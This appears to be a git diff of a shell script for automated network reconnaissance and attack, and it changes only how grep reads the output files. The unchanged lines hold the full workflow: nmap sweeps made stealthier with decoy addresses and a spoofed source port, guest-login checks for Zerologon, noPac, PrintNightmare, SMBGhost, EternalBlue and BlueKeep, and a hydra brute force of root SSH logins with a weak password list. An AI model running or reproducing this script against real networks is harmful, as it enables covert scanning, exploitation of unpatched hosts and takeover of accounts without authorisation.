@@ -34,38 +34,38 @@ mkdir -p tmp
 
 # TESTS
 nmap -sn -PE $RSUBNET -D RND:5 --source-port 53 --disable-arp-ping -oG nmap/full_hosts.txt
-cat nmap/full_hosts.txt | grep "Status: Up" |awk '{print $2}' > ip_files/full_hosts_ips.txt
+cat nmap/full_hosts.txt | grep "Status: Up" --text |awk '{print $2}' > ip_files/full_hosts_ips.txt
 gowitness scan file -f ip_files/full_hosts_ips.txt --threads 50 --ports-medium --write-none
 nmap -iL ip_files/full_hosts_ips.txt --disable-arp-ping -n -sS -Pn -D RND:5 --source-port 53  -p 445 -oG nmap/windows_hosts.txt
 nmap -iL ip_files/full_hosts_ips.txt --disable-arp-ping -n -sS -Pn -p 22 -D RND:5 --source-port 53 -oG nmap/linux_hosts.txt
-cat nmap/windows_hosts.txt | grep 445/open |awk '{print $2}' > ip_files/windows_hosts_ips.txt
+cat nmap/windows_hosts.txt | grep 445/open --text |awk '{print $2}' > ip_files/windows_hosts_ips.txt
 nmap -iL ip_files/windows_hosts_ips.txt --disable-arp-ping -n -Pn -D RND:5 --source-port 53 -p 445 -sCV | tee vulns/nmap_smb_scan.txt
 nmap -iL ip_files/windows_hosts_ips.txt --disable-arp-ping -n -sS -Pn -D RND:5 --source-port 53 -p 88 -oG nmap/ad.txt
 nmap -iL ip_files/full_hosts_ips.txt --disable-arp-ping -n -sCV -Pn -D RND:5 --source-port 53 -p 3389 -oG nmap/rdp_hosts.txt
-cat nmap/ad.txt | grep 88/open |awk '{print $2}' > ip_files/ad_hosts_ips.txt
-cat nmap/rdp_hosts.txt | grep 3389/open |awk '{print $2}' > ip_files/rdp_hosts_ips.txt
+cat nmap/ad.txt | grep 88/open --text |awk '{print $2}' > ip_files/ad_hosts_ips.txt
+cat nmap/rdp_hosts.txt | grep 3389/open --text |awk '{print $2}' > ip_files/rdp_hosts_ips.txt
 for AD_IP in $(cat ip_files/ad_hosts_ips.txt); do ctfenum $AD_IP; done
 
 echo ' ' >> tmp/guest.txt
 echo 'guest' >> tmp/guest.txt
 echo 'invité' >> tmp/guest.txt
 
-nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M nopac | grep '^SMB' | tee vulns/nopac_scan.txt
-nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M zerologon | grep '^SMB' | tee vulns/zerologon.txt
-nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M enum_ca | grep '^SMB' | tee vulns/certificates.txt
-nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M printnightmare | grep '^SMB' | tee vulns/printing_nightmare.txt
-nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M smbghost | grep '^SMB' | tee vulns/smbghost.txt
-nxc smb ip_files/windows_hosts_ips.txt -u tmp/guest.txt -p '' --shares | grep '^SMB' | tee vulns/nxc_smb_map.txt
-nxc smb ip_files/windows_hosts_ips.txt -u tmp/guest.txt -p '' -M ms17-010 | grep '^SMB' | tee vulns/eternal_blue_scan.txt
+nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M nopac | grep '^SMB' --text | tee vulns/nopac_scan.txt
+nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M zerologon | grep '^SMB' --text | tee vulns/zerologon.txt
+nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M enum_ca | grep '^SMB' --text | tee vulns/certificates.txt
+nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M printnightmare | grep '^SMB' --text | tee vulns/printing_nightmare.txt
+nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M smbghost | grep '^SMB' --text | tee vulns/smbghost.txt
+nxc smb ip_files/windows_hosts_ips.txt -u tmp/guest.txt -p '' --shares | grep '^SMB' --text | tee vulns/nxc_smb_map.txt
+nxc smb ip_files/windows_hosts_ips.txt -u tmp/guest.txt -p '' -M ms17-010 | grep '^SMB' --text | tee vulns/eternal_blue_scan.txt
 
 for RDP_IP in $(cat ip_files/rdp_hosts_ips.txt); do msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RDP_CLIENT_IP $LHOST;set rhosts $RDP_IP;run;exit;" | tee -a bluekeep_scan.txt; done
-cat nmap/linux_hosts.txt | grep 22/open |awk '{print $2}' > ip_files/linux_hosts_ips.txt
+cat nmap/linux_hosts.txt | grep 22/open --text |awk '{print $2}' > ip_files/linux_hosts_ips.txt
 echo 'rootroot' >> tmp/pws.txt
 echo 'ROOT' >> tmp/pws.txt
 echo 'Root' >> tmp/pws.txt
 echo 'ROOTROOT' >> tmp/pws.txt
 echo 't00r' >> tmp/pws.txt
-hydra -l root -P tmp/pws.txt -e nsr -t 4 -M ip_files/linux_hosts_ips.txt ssh | grep 'login' | grep 'password' | tee vulns/ssh_bruteforce.txt
+hydra -l root -P tmp/pws.txt -e nsr -t 4 -M ip_files/linux_hosts_ips.txt ssh | grep 'login' --text | grep 'password' --text | tee vulns/ssh_bruteforce.txt
 
 # EXPORT
 git add .
